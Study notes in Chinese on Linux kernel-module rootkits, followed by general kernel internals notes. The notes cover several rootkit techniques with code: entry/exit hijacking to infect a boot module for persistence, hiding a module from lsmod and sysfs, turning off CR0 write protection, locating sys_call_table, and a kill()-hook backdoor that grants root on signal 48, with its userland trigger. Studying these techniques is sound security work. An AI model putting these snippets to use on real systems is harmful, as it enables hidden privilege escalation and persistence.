# Rootkit Learning

[TOC]



## LKM（Linux 可加载模块）

### 定义

[IBM Developer——Linux  lkm]( https://www.ibm.com/developerworks/cn/linux/l-lkm/ )

​	典型的程序有一个 main 函数，其中 LKM 包含 entry 和 exit 函数（在 2.6 版本，您可以任意命名这些函数）。当向内核插入模块时，调用 entry 函数，从内核删除模块时则调用 exit 函数。因为 entry 和 exit 函数是用户定义的，所以存在 `module_init` 和 `module_exit` 宏，用于定义这些函数属于哪种函数。LKM 还包含一组必要的宏和一组可选的宏，用于定义模块的许可证、模块的作者、模块的描述等等。 

比如：

```
#include <linux/module.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Module Author");
MODULE_DESCRIPTION("Module Description");

static int __init mod_entry_func(void)
{
	return 0;
}

static void __init mod_exit_func(void)
{
	return;
}

module_init(mod_entry_func);
module_exit(mod_exit_func);
```

2.6版本的Linux内核提供了几个方法来管理内核模块

>  `insmod`（安装 LKM），`rmmod` （删除 LKM），`modprobe`（`insmod` 和 `rmmod` 的包装器），`depmod`（用于创建模块依赖项），以及 `modinfo`（用于为模块宏查找值） 

### LKM执行与结束

从`LKM`的入口/出口函数说起。我们知道，既可以使用默认名称作为入口/出口函数名，也可以使用自己定义的名字。两种方法如下：

默认名：

```
int init_module(void){...}

void cleanup_module(void){...}
```

自定义名：

```
int test_init(void){...}
void test_exit(void){...}

module_init(test_init);
module_exit(test_exit);
```

第一种方法比第二种少了`module_init/module_exit`的注册过程。我们猜想，这个注册过程把`test_init`与`init_module`做了某种联系。

看一下源码`include/linux/module.h`:

```
/* Each module must use one module_init(). */
#define module_init(initfn)					\
	static inline initcall_t __inittest(void)		\
	{ return initfn; }					\
	int init_module(void) __attribute__((alias(#initfn)));

/* This is only required if you want to be unloadable. */
#define module_exit(exitfn)					\
	static inline exitcall_t __exittest(void)		\
	{ return exitfn; }					\
	void cleanup_module(void) __attribute__((alias(#exitfn)));
```

上面的`alias`是 GCC 的拓展功能，给函数起别名并关联起来。所以最终被使用的还是`init_module/cleanup_module`这两个名字。



### 编译过程

noinj.c

```
# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# endif // CPP

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

int
noinj_init(void)
{
    fm_alert("noinj: %s\n", "Greetings the World!");

    return 0;
}

void
noinj_exit(void)
{
    fm_alert("noinj: %s\n", "Farewell the World!");

    return;
}

module_init(noinj_init);
module_exit(noinj_exit);

int
fake_init(void)
{
    noinj_init();

    fm_alert("==> NOINJ: %s\n", "GR33TINGS THE W0RLD!");

    return 0;
}

int
fake_exit(void)
{
    noinj_exit();

    fm_alert("==> NOINJ: %s\n", "FAR3W311 THE W0RLD!");

    return 0;
}
```

编译生成的noinj.ko文件是一个可重定位文件。

- 根据`noinj.c`生成`noinj.o`
- 编译器生成一个`noinj.mod.c`源文件
- 根据`noinj.mod.c`生成`noinj.mod.o`
- 将`noinj.o`与`noinj.mod.o`链接为`noinj.ko`

我们看一下`noinj.mod.c`，比较有意思的是下面几行：

```
__visible struct module __this_module
__attribute__((section(".gnu.linkonce.this_module"))) = { 
    .name = KBUILD_MODNAME,
    .init = init_module,
#ifdef CONFIG_MODULE_UNLOAD
    .exit = cleanup_module,
#endif
    .arch = MODULE_ARCH_INIT,
};
```

`__this_module`即用来表示我们的模块的数据结构，它将被放在`.gnu.linkonce.this_module`节中。入口函数和出口函数都是默认的，其原因我们在**预备一**中已经解释过。

如果我们把`init_module/cleanup_module`的值分别改为`fake_init/fake_exit`的值，则当模块加载进行符号解析和重定位时，它们就会分别被解析定位到`fake_init/fake_exit`上，从而导致假的入口/出口函数被执行。 



### rootkit持久化

根据上面的思路我们已经实现同模块入口出口劫持。这里，我们希望将一个模块的入口出口函数替换为另一个模块的入口出口函数。如果能够实现，我们就可以使用新的模块去替换`lib/modules/$(uname -r)/kernel/`下的某个开机加载模块，从而实现 rootkit 持久化。 

为达到这个目的，有几个问题：

- 感染/替换哪个系统模块？

由于后面我们要进行测试，需要`rmmod`，所以最好找一个已加载但没有被使用的模块。我们可以在`lsmod`命令输出中找一个`Used`数为零的模块。后面将以`ac`模块为例。

`ac`模块的路径是`/lib/modules/$(uname -r)/kernel/drivers/acpi/ac.ko`。

- 怎样得知系统内核模块的入口/出口函数名？

一方面，我们可以在`readelf -s ac.ko`中找长得像的；

另一方面，我们可以在相应内核源码中找准确定义：

在`drivers/acpi/ac.c`中搜索`module_init`：

```
module_init(acpi_ac_init);
module_exit(acpi_ac_exit);
```







### 隐藏模块

主要隐藏的目标为：

1. 对lsmod隐藏
2. 对/proc/modules隐藏
3. 对/sys/module隐藏



其中，lsmod是通过读取/proc/modules来发挥作用的，因此我们对/proc/modules进行处理就能解决前面两个目标，另外需要处理/sys/module/下的模块子目录。



/proc/modules的内容是内核利用struct modules结构体的表头去遍历内核模块链表

对于/sys/module下的隐藏需要操纵kobject的fd对象，具体实现请看代码



### 关闭写保护

[CR0寄存器](https://en.wikipedia.org/wiki/Control_register#CR0)

 写保护指的是写入只读内存时出错，可以通过CR0寄存器控制开启与否，修改从0开始的第16个Bit

![image-20191028130225360](Rootkit Learning.assets/image-20191028130225360.png)

可以使用`read_cr0`，`write_cr0`来读取和写入CR0寄存器

```
static inline unsigned long read_cr0(void);
static inline void write_cr0(unsigned long x);
```

```
// ========== WRITE_PROTECTION HELPER ==========
// TODO: Consider race condition on SMP systems.
void
disable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}


// TODO: Consider race condition on SMP systems.
void
enable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}
// ========== END WRITE_PROTECTION HELPER ==========
```





### 获取指定PID的Task

```

struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}
```





### 获取sys_call_table地址

#### 暴力搜索地址空间

[参考](https://wohin.me/rootkit/2017/05/08/LinuxRootkitExp-0001.html)

1. 内核内存空间的起始地址`PAGE_OFFSET`变量和`sys_close`系统调用对我们是可见的（`sys_open`/`sys_read`等并未导出）；
2. 系统调用号（即`sys_call_table`中的元素下标）在同一`ABI`（x86与x64属于不同ABI）中是高度后向兼容的；这个系统调用号我们也是可以直接引用的（如`__NR_close`）。
3. 所以我们可以从内核空间起始地址开始，把每一个指针大小的内存假设成`sys_call_table`的地址，并用`__NR_close`索引去访问它的成员，如果这个值与`sys_close`的地址相同的话，就可以认为找到了`sys_call_table`的地址 

该方法有可能被欺骗。

PAGE_OFFSET的定义

[参考](http://www.kerneltravel.net/chenlj/lecture7.pdf)

```
#define PAGE_OFFSET		((unsigned long)__PAGE_OFFSET)
#define __PAGE_OFFSET           page_offset_base
unsigned long page_offset_base = __PAGE_OFFSET_BASE;
EXPORT_SYMBOL(page_offset_base);
#define __PAGE_OFFSET_BASE      _AC(0xffff880000000000, UL)
```

#### 通过某些寄存器来读取

读取 `MSR_LSTAR` register来获取

[参考](http://bw0x00.blogspot.de/2011/03/find-syscalltable-in-linux-26.html)

```
#ifndef SYSCALLTABLE_H
#define SYSCALLTABLE_H

#include <linux/types.h>
#include <asm/msr-index.h>

unsigned long **get_syscalltable(void);

#endif


/*
 * from: http://bw0x00.blogspot.de/2011/03/find-syscalltable-in-linux-26.html
 */
unsigned long **get_syscalltable(void)
{
	int i, lo, hi;
	unsigned char *ptr;
	unsigned long system_call;

	alert("GETTING SYS_CALL_TABLE");

	/* http://wiki.osdev.org/Inline_Assembly/Examples#RDMSR */
	asm volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (MSR_LSTAR));
	system_call = (unsigned long)(((long)hi << 32) | lo);

	/* loop until first 3 bytes of instructions are found */
	for (ptr = (unsigned char *)system_call, i = 0; i < 500; i++)  {
		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
			debug("SYS_CALL_TABLE FOUND");
			/* set address together */
			return (unsigned long **)(0xffffffff00000000 
				| *((unsigned int *)(ptr + 3)));
		}

		ptr++;
	}

	debug("SYS_CALL_TABLE NOT FOUND");

	return NULL;
}

```









### ROOT提权后门

**方案一**

向特定文件写入指定内容，该文件可以使用文件隐藏隐藏起来

[全志后门](https://github.com/allwinner-zh/linux-3.4-sunxi/blob/bd5637f7297c6abf78f93b31fc1dd33f2c1a9f76/arch/arm/mach-sunxi/sunxi-debug.c#L41)

[参考](https://wohin.me/rootkit/2017/05/11/LinuxRootkitExp-00020.html)

**方案二**

Hook kill函数，发送指定SIGNAL信号

```
#define SIGROOT 48
asmlinkage int fake_kill(pid_t pid, int sig){
    switch(sig){
        case SIGROOT:
            commit_creds(prepare_kernel_cred(0));
            break;
	default:
            return o_kill(pid,sig);

    }
    return 0;
}
```



```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

void sig_handler(int sig) {
    if(sig) // avoid warnings

    return;
}

int main(int argc, char *argv[]) {
    char bash[] = "/bin/bash\x00";
    char *envp[1] = { NULL };
    char *arg[3] = {"/bin/bash", NULL};
    
    if(geteuid() == 0){
        printf("You are already root! :)\n\n");
        exit(0);
    } 
    
    signal(48, sig_handler);
    kill(getpid(), 48);

    if (geteuid() == 0){
        printf("\e[01;36mYou got super powers!\e[00m\n\n");
        execve(bash, arg, envp);
    } else {
        printf("\e[00;31mYou have no power here! :( \e[00m\n\n");
    }
        
    return 0;
}


```



### 文件隐藏

要实现文件隐藏需要对文件遍历有所了解。

 文件遍历主要通过是系统调用`getdents`和`getdents64`实现，它们的作用是获取目录项。 











## 内核编程学习



**LINUX_VERSION_CODE和KERNEL_VERSION**

[内核版本号以及判断方法](https://www.jianshu.com/p/045b98f070f1)

关于Linux内核版本的两个宏定义在`/usr/include/linux/version.h`

```
#define LINUX_VERSION_CODE 263213
#define KERNEL_VERSION(a,b,c) (((a) << 16) + ((b) << 8) + (c))
```

假如我内核版本为4.4.45

- 首先将4.4.45 转为16进制为 0x04.0x04.0x2D
- 然后宏 KERNEL_VERSION(0x04,0x04,0x2D)展开之后得到04042D 这个16进制的数字
- 最后将0x040423 转化为十进制就得到了十进制的263213 即为 LINUX_VERSION_CODE的值263213

在使用时，可以根据版本号不同调用不同的API保持兼容

```
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,10,0)
....//3.10.0 之前的API调用
#else 
....//3.10.0 版本之后的API调用
#endif 
```



**struct module**

[参考](https://blog.csdn.net/jk110333/article/details/8563647)

当使用insmod插入一个内核模块时，实际上调用的时系统调用init_module，在init_module中首先调用的是load_module，把用户态传入的整个内核模块文件创建成一个内核模块，返回一个struct module结构体，内核中就以此结构体代表该内核模块。

结构体struct module在内核中代表一个内核模块，其定义如下

```
struct module
    {
        enum module_state state;  //表示模块当前状态，枚举类型
        struct list_head list;  /作为一个全局链表的成员
        char name[MODULE_NAME_LEN];   //模块名字，一般以模块文件的文件名作为模块名
 
        struct module_kobject mkobj;  //组成设备模型的基本结构
        struct module_param_attrs *param_attrs;
        const char *version;
        const char *srcversion;
 
        const struct kernel_symbol *syms;
        unsigned int num_syms;
        const unsigned long *crcs;
 
        const struct kernel_symbol *gpl_syms;
        unsigned int num_gpl_syms;
        const unsigned long *gpl_crcs;
 
        unsigned int num_exentries;
        const struct exception_table_entry *extable;
 
        int (*init)(void);
        void *module_init;
        void *module_core;
        unsigned long init_size, core_size;
        unsigned long init_text_size, core_text_size;
        struct mod_arch_specific arch;
        int unsafe;
        int license_gplok;
 
#ifdef CONFIG_MODULE_UNLOAD
        struct module_ref ref[NR_CPUS];
        struct list_head modules_which_use_me;
        struct task_struct *waiter;
        void (*exit)(void);
#endif
 
#ifdef CONFIG_KALLSYMS
        Elf_Sym *symtab;
        unsigned long num_symtab;
        char *strtab;
        struct module_sect_attrs *sect_attrs;
#endif
        void *percpu;
        char *args;
    };
```

enum module_state state

```
enum module_state
{
    MODULE_STATE_LIVE,  //模块当前正常使用中（存活状态） 0
    MODULE_STATE_COMING, //模块当前正在被加载  1 
    MODULE_STATE_GOING,  //模块当前正在被卸载  2
};
```

当load_module完成模块的创建工作后，会把状态置为MODULE_STATE_COMING，sys_init_module函数中完成模块的全部初始化工作后（包括把模块加入全局的模块列表，调用模块本身的初始化函数)，把模块状态置为MODULE_STATE_LIVE，最后，使用rmmod工具卸载模块时，会调用系统调用 delete_module，会把模块的状态置为MODULE_STATE_GOING。这是模块内部维护的一个状态。

struct list_head list

>  list是作为一个列表的成员，所有的内核模块都被维护在一个全局链表中，链表头是一个全局变量struct module *modules。任何一个新创建的模块，都会被加入到这个链表的头部 

**struct module_kobject mkobj**

[参考](https://www.cnblogs.com/xiaojiang1025/p/6193959.html)

[参考](http://kcmetercec.top/2018/03/09/linux_kernel_sysfs_tutorial/)

[参考](https://www.twblogs.net/a/5b8b2ccf2b717718832dd8f0/zh-cn)

```
//include/linux/module.h

struct module_kobject {
	struct kobject kobj;
	struct module *mod;
	struct kobject *drivers_dir;
	struct module_param_attrs *mp;
	struct completion *kobj_completion;
};

//include/linux/kobject.h

struct kobject {  
    const char          *name;   //kobject对象的名字，对应sysfs下的一个目录
    struct list_head    entry;   //kobject中插入的head_list结构
    struct kobject      *parent;  //指向当前kobject父对象的指针，体现在sys结构中就是包含当前kobject对象的目录对象
    struct kset         *kset;    //表示当前kobject对象所属的集合
    struct kobj_type    *ktype;   //表示当前kobject的类型
    struct kernfs_node  *sd;     //表示VFS文件系统的目录项
    struct kref         kref;   // 对kobject的引用计数，当引用计数为0时，就回调之前注册的release方法释放该对象
    #ifdef CONFIG_DEBUG_KOBJECT_RELEASE  
    	struct delayed_work release;
    #endif
        unsigned int state_initialized:1;
        unsigned int state_in_sysfs:1;
        unsigned int state_add_uevent_sent:1;
        unsigned int state_remove_uevent_sent:1;
        unsigned int uevent_suppress:1;
};
```

>  `kobject`是组成设备模型的基本结构。`sysfs`是基于 RAM 的文件系统，它提供了用于向用户空间展示内核空间里对象、属性和链接的方法。`sysfs`和`kobject`层次紧密相连，将`kobject`层次关系展示出来，让用户层能够看到。一般`sysfs`挂载在`/sys/`，所以`/sys/module`就是`sysfs`的一个目录层次，包含当前加载的模块信息。所以，我们使用`kobject_del()`删除我们的模块的`kobject`，就可以达到隐藏的目的。 

kobject_del

```
//lib/kobject.c

void kobject_del(struct kobject *kobj)
{
	struct kernfs_node *sd;

	if (!kobj)
		return;

	sd = kobj->sd;       //获取kobj对象的文件系统目录项
	sysfs_remove_dir(kobj); //调用sysfs_remove_dir实际上是把kobj的sd结构置为NULL
	sysfs_put(sd);

	kobj->state_in_sysfs = 0;
	kobj_kset_leave(kobj);
	kobject_put(kobj->parent);
	kobj->parent = NULL;
}
```

struct kernfs_node  *sd;

```
struct kernfs_node {
	atomic_t		count;   //相关计数
	atomic_t		active;  //相关计数
#ifdef CONFIG_DEBUG_LOCK_ALLOC
	struct lockdep_map	dep_map;
#endif
	struct kernfs_node	*parent;  //本节点的父节点，这个比较重要，属性是文件，父节点是kobject
	const char		*name;     //节点名字

	struct rb_node		rb;     //红黑树节点

	const void		*ns;	//命名空间相关
	unsigned int		hash;	//命名空间相关
	//定义联合体
	union {
		struct kernfs_elem_dir		dir;     //目录
		struct kernfs_elem_symlink	symlink;   //符号链接
		struct kernfs_elem_attr		attr;    //属性
	};

	void			*priv;        //私有数据，kobject作为私有数据随kernfs_node传递

	unsigned short		flags;    //文件相关属性
	umode_t			mode;    //文件相关属性
	unsigned int		ino;   //子设备号
	struct kernfs_iattrs	*iattr;    //节点本身属性
};

```

struct kernfs_elem_attr

```
struct kernfs_elem_attr {
	const struct kernfs_ops	*ops;
	struct kernfs_open_node	*open;
	loff_t			size;
	struct kernfs_node	*notify_next;	/* for kernfs_notify() */
};
```



sysfs_remove_dir(kobj);

```
void sysfs_remove_dir(struct kobject *kobj)
{
	struct kernfs_node *kn = kobj->sd;
	spin_lock(&sysfs_symlink_target_lock);
	kobj->sd = NULL;
	spin_unlock(&sysfs_symlink_target_lock);

	if (kn) {
		WARN_ON_ONCE(kernfs_type(kn) != KERNFS_DIR);
		kernfs_remove(kn);
	}
}
```

**红黑树rbtree**

[参考](https://biscuitos.github.io/blog/Tree_RBTREE_rb_set_parent_color/)





**THIS_MODULE**

>  结构体*struct module*在内核中代表一个内核模块，通过*insmod(*实际执行*init_module*系统调用*)*把自己编写的内核模块插入内核时，模块便与一个 *struct module*结构体相关联，并成为内核的一部分。 

宏THIS_MODULE，它的定义如下

```
#define THIS_MODULE (&__this_module)
```

`__this_module`是一个struct module变量，代表当前模块。可以通过THIS_MODULE宏来引用模块的struct module结构。



**内核中的链表**

[参考](https://blog.popkx.com/linux-learning-18-how-the-kernel-operates-linked-lists/)

[参考](https://blog.csdn.net/funkunho/article/details/52041012)

一般地，内核中常采用链表来管理对象，定义如下

```
struct list_head {
	struct list_head *next, *prev;
};
```

把链表放入其他数据结构来进行管理，就像一根锁链把要管理的对象链在一起

初始化的两种方式：

1. struct list_head mylist;

```
struct list_head mylist;  // 定义一个链表
INIT_LIST_HEAD(&mylist); // 使用INIT_LIST_HEAD函数初始化链表

static inline void INIT_LIST_HEAD(struct list_head *list)
 {
     list->next = list;
     list->prev = list;
 }
```

经过INIT_LIST_HEAD之后，struct list_head mylist = {&(mylist) , &(mylist) };

也就是next和prev都被赋值为链表mylist的地址，链表初始化都是指向自己的，避免指向未知区域，这点很重要， 如果使用一个未被初始化的链表结点，很有可能会导致内核异常。 

2. LIST_HEAD(mylist)

使用LIST_HEAD宏定义初始化一个链表

```
#define LIST_HEAD_INIT(name) { &(name), &(name) }
#define LIST_HEAD(name) /
         struct list_head name = LIST_HEAD_INIT(name)
```



**链表的常用操作**

- 增加

list_add 和 list_add_tail

调用list_add可以将一个新链表结点插入到一个已知结点的后面；

调用list_add_tail可以将一个新链表结点插入到一个已知结点的前面；

这两个函数以不同的参数调用了相同的函数`__list_add`

```
static inline void __list_add(struct list_head *new , struct list_head *prev , struct list_head *next)
{
    next->prev = new;
    new->next = next;
    new->prev = prev;
    prev->next = new;
}
```

该函数将new节点插入到prev节点和next节点之间，由prev->new->next

对于list_add：

```
static inline void list_add(struct list_head *new, struct list_head *head)
{
	__list_add(new, head, head->next);
	//将new结点插入到head和head->next之间，也就是将new结点插入到特定的已知结点head的后面
}
```

对于list_add_tail：

```
static inline void list_add_tail(struct list_head *new, struct list_head *head)
{
	__list_add(new, head->prev, head);
	//将new结点插入到head->prev和head之间，也就是将new结点插入到特定的已知结点head的前面
}
```



- 删除

 list_del 和 list_del_init 

调用list_del函数删除链表中的一个结点；

调用list_del_init函数删除链表中的一个结点，并初始化被删除的结点（也就是使被删除的结点的prev和next都指向自己）；

这两个函数也调用了相同的函数__list_del：

```
static inline void __list_del(struct list_head * prev, struct list_head * next)
{
    next->prev = prev;
    prev->next = next;
}
```

 让prev结点和next结点互相指向 

对于list_del：

```
static inline void list_del(struct list_head *entry)
{
    __list_del(entry->prev, entry->next);  //就是entry节点的前后节点绕过entry节点相互指向
    entry->next = LIST_POISON1;            
    entry->prev = LIST_POISON2;
    //将entry结点的前后指针指向LIST_POISON1和LIST_POISON2，从而完成对entry结点的删除
}
```

LIST_POISON1和LIST_POISON2指得是什么暂时不清楚，一般来说要把这个节点释放掉都是指向NULL

对于list_del_init：

```
static inline void list_del_init(struct list_head *entry)
{
	__list_del(entry->prev, entry->next);
	INIT_LIST_HEAD(entry);
}
```

与list_del不同，list_del_init将entry结点删除后，还会对entry结点做初始化，使得entry结点的prev和next都指向自己。 

- typeof、offsetof 和 container_of

定义如下：

```
#include <stddef.h>
#define offsetof(TYPE, MEMBER) ((size_t) &((TYPE*)0)->MEMBER)

#define container_of(ptr, type, member) ({          \
        const typeof( ((type *)0)->member ) *__mptr = (const typeof( ((type *)0)->member ) *)(ptr); \
        (type *)( (char *)__mptr - offsetof(type,member) );})
```

typeof是GNU对C新增得一个扩展关键字，用于获取对象类型，通常我们需要处理的对象都是指针，如果想知道指针所指向的对象的类型，可以使用typeof。

offsetof返回结构体TYPE中MEMBER成员相对于结构体首地址的偏移量。为什么offsetof可以得到某个成员的偏移量？

> `(TYPE *)0`,将 0 强制转换为`TYPE`型指针，记 `p = (TYPE *)0`，`p`是指向`TYPE`的指针，它的值是0。那么 `p->MEMBER` 就是 `MEMBER` 这个元素了，而`&(p->MEMBER)`就是`MEMBER`的地址，编译器认为0是一个有效的地址，则基地址为0，这样就巧妙的转化为了`TYPE`中的偏移量。再把结果强制转换为`size_t`型的就OK了。

container_of的作用的通过结构体变量中的一个域成员变量的指针来获取指向整个结构体变量的指针

>  创建一个类型为`const typeof( ((type *)0)->member ) *`，即类型为`type`结构的`member`域所对应的对象类型的常指针`__mptr` ，使用`ptr`初始化， 也就是获取到了member的地址。
>
>  因为数据结构是顺序存储的，此时如果知道`member`在`type`结构中的相对偏移，那么用`__mptr`减去此偏移便是`ptr`所属的`type`的地址。  



- list_entry

有了上面的基础就比较好理解，已知某个结构体abc的list对象地址（struct list_head *ptr），怎么获取到abc对象的地址呢，使用container_of宏！不过这里应该使用list_entry来做

```
#define list_entry(ptr, type, member)  container_of(ptr, type, member) ......
```

因此list_entry的作用就是获取某个成员对象所在的对象的地址。



- list_for_each_entry

```
/**
 * list_for_each_entry	-	iterate over list of given type
 * @pos:	the type * to use as a loop cursor.
 * @head:	the head for your list.
 * @member:	the name of the list_struct within the struct.
 */
#define list_for_each_entry(pos, head, member)				\
	for (pos = list_entry((head)->next, typeof(*pos), member);	\
	     &pos->member != (head); 	\
	     pos = list_entry(pos->member.next, typeof(*pos), member))
```







**proc_dir_entry 结构体**

定义在`fs/proc/internal.h`

struct proc_dir_entry 结构体是用来管理/proc文件系统目录项 ，在不同版本中可能有差异

```
struct proc_dir_entry {
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;         /* use count */
    atomic_t in_use;        /* number of callers into module in progress; */
                            /* negative -> it's going away RSN */
    struct completion *pde_unload_completion;
    struct list_head pde_openers;   /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
};
```



**pr_fmt**

针对特定的模板定义的

` include\linux\printk.h `

 在用户要输出的log前面添加额外的固定的信息 ，比如

```
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt /* has to precede printk.h */
```



 https://github.com/croemheld/lkm-rootkit/blob/master/src/module_hiding.c 





**getdents64**

[参考](http://www.cppblog.com/momoxiao/archive/2010/04/04/111594.aspx)

getdents64读取目录文件中的一个个目录项(directory entry)并返回 



```
/fs/readdir.c
asmlinkage long sys_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count)
{
    struct file * file;
    struct linux_dirent64 __user * lastdirent;
    struct getdents_callback64 buf;
    int error;

    error = -EFAULT;
    if (!access_ok(VERIFY_WRITE, dirent, count))
        goto out;

    error = -EBADF;
    file = fget(fd);
    if (!file)
        goto out;

    buf.current_dir = dirent;
    buf.previous = NULL;
    buf.count = count;
    buf.error = 0;

    error = vfs_readdir(file, filldir64, &buf); ///读取目录函数
    if (error < 0)
        goto out_putf;
    error = buf.error;
    lastdirent = buf.previous;
    if (lastdirent) {
        typeof(lastdirent->d_off) d_off = file->f_pos;
        error = -EFAULT;
        if (__put_user(d_off, &lastdirent->d_off))
            goto out_putf;
        error = count - buf.count;
    }

out_putf:
    fput(file);
out:
    return error;
}
```

 在sys_getdents64中通过调用vfs_readdir()读取目录函数 

```
/fs/reddir.c
int vfs_readdir(struct file *file, filldir_t filler, void *buf)
{
    struct inode *inode = file->f_path.dentry->d_inode;
    int res = -ENOTDIR;
    if (!file->f_op || !file->f_op->readdir)
        goto out;

    res = security_file_permission(file, MAY_READ);
    if (res)
        goto out;

    res = mutex_lock_killable(&inode->i_mutex);
    if (res)
        goto out;

    res = -ENOENT;
    if (!IS_DEADDIR(inode)) {
        res = file->f_op->readdir(file, buf, filler); ///调用实际文件系统的读取目录项(就是文件系统三层结构中最下面一层)
        file_accessed(file);
    }
    mutex_unlock(&inode->i_mutex);
out:
    return res;
}
```

 file结构里有个文件操作的函数集const struct file_operations *f_op。
struct file_operations 中实际上是一些函数的指针，readdir就是其中的一个指针。
在调用vir_readdir之前，内核会根据实际文件系统类型给struct file_operations赋对应值。 

file结构如下：

```
/include/linux/fs.h
struct file {
    /*
     * fu_list becomes invalid after file_free is called and queued via
     * fu_rcuhead for RCU freeing
     */
    union {
        struct list_head    fu_list;
        struct rcu_head     fu_rcuhead;
    } f_u;
    struct path        f_path;
#define f_dentry    f_path.dentry
#define f_vfsmnt    f_path.mnt
    const struct file_operations    *f_op; ///对应每一种实际的文件系统，会有自己的file_operations函数集。可以理解成file这个类的纯虚函数集
    atomic_long_t        f_count;
    unsigned int         f_flags;
    mode_t            f_mode;
    loff_t            f_pos;
    struct fown_struct    f_owner;
    unsigned int        f_uid, f_gid;
    struct file_ra_state    f_ra;

    u64            f_version;
#ifdef CONFIG_SECURITY
    void            *f_security;
#endif
    /* needed for tty driver, and maybe others */
    void            *private_data;

#ifdef CONFIG_EPOLL
    /* Used by fs/eventpoll.c to link all the hooks to this file */
    struct list_head    f_ep_links;
    spinlock_t        f_ep_lock;
#endif /* #ifdef CONFIG_EPOLL */
    struct address_space    *f_mapping;
#ifdef CONFIG_DEBUG_WRITECOUNT
    unsigned long f_mnt_write_state;
#endif
};
```

 file_operations结构，里面是一些函数指针。我们在这儿关心的是int (*readdir) (struct file *, void *, filldir_t);
readdir()用来读取实际文件系统目录项。 

```
struct file_operations {
    struct module *owner;
    loff_t (*llseek) (struct file *, loff_t, int);
    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
    ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
    ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
    int (*readdir) (struct file *, void *, filldir_t);  ///我们在这儿关心的函数指针，实际文件系统的读取目录项函数。
                ///每次打开文件，内核都会根据文件位于的文件系统类型，对文件相应的file_operations赋相应值。
    unsigned int (*poll) (struct file *, struct poll_table_struct *);
    int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);
    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
    int (*mmap) (struct file *, struct vm_area_struct *);
    int (*open) (struct inode *, struct file *);
    int (*flush) (struct file *, fl_owner_t id);
    int (*release) (struct inode *, struct file *);
    int (*fsync) (struct file *, struct dentry *, int datasync);
    int (*aio_fsync) (struct kiocb *, int datasync);
    int (*fasync) (int, struct file *, int);
    int (*lock) (struct file *, int, struct file_lock *);
    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
    int (*check_flags)(int);
    int (*dir_notify)(struct file *filp, unsigned long arg);
    int (*flock) (struct file *, int, struct file_lock *);
    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
    int (*setlease)(struct file *, long, struct file_lock **);
};
```

 在ls用到file结构中的file_operations之前，内核是怎样它赋值的 

```
struct inode *ext2_iget (struct super_block *sb, unsigned long ino)
{
    struct ext2_inode_info *ei;
    struct buffer_head * bh;
    struct ext2_inode *raw_inode;
    struct inode *inode;
    long ret = -EIO;
    int n;

    inode = iget_locked(sb, ino);
    if (!inode)
        return ERR_PTR(-ENOMEM);
    if (!(inode->i_state & I_NEW))
        return inode;

    ei = EXT2_I(inode);
#ifdef CONFIG_EXT2_FS_POSIX_ACL
    ei->i_acl = EXT2_ACL_NOT_CACHED;
    ei->i_default_acl = EXT2_ACL_NOT_CACHED;
#endif
    ei->i_block_alloc_info = NULL;

    raw_inode = ext2_get_inode(inode->i_sb, ino, &bh);
    if (IS_ERR(raw_inode)) {
        ret = PTR_ERR(raw_inode);
         goto bad_inode;
    }

    inode->i_mode = le16_to_cpu(raw_inode->i_mode);
    inode->i_uid = (uid_t)le16_to_cpu(raw_inode->i_uid_low);
    inode->i_gid = (gid_t)le16_to_cpu(raw_inode->i_gid_low);
    if (!(test_opt (inode->i_sb, NO_UID32))) {
        inode->i_uid |= le16_to_cpu(raw_inode->i_uid_high) << 16;
        inode->i_gid |= le16_to_cpu(raw_inode->i_gid_high) << 16;
    }
    inode->i_nlink = le16_to_cpu(raw_inode->i_links_count);
    inode->i_size = le32_to_cpu(raw_inode->i_size);
    inode->i_atime.tv_sec = (signed)le32_to_cpu(raw_inode->i_atime);
    inode->i_ctime.tv_sec = (signed)le32_to_cpu(raw_inode->i_ctime);
    inode->i_mtime.tv_sec = (signed)le32_to_cpu(raw_inode->i_mtime);
    inode->i_atime.tv_nsec = inode->i_mtime.tv_nsec = inode->i_ctime.tv_nsec = 0;
    ei->i_dtime = le32_to_cpu(raw_inode->i_dtime);
    /* We now have enough fields to check if the inode was active or not.
     * This is needed because nfsd might try to access dead inodes
     * the test is that same one that e2fsck uses
     * NeilBrown 1999oct15
     */
    if (inode->i_nlink == 0 && (inode->i_mode == 0 || ei->i_dtime)) {
        /* this inode is deleted */
        brelse (bh);
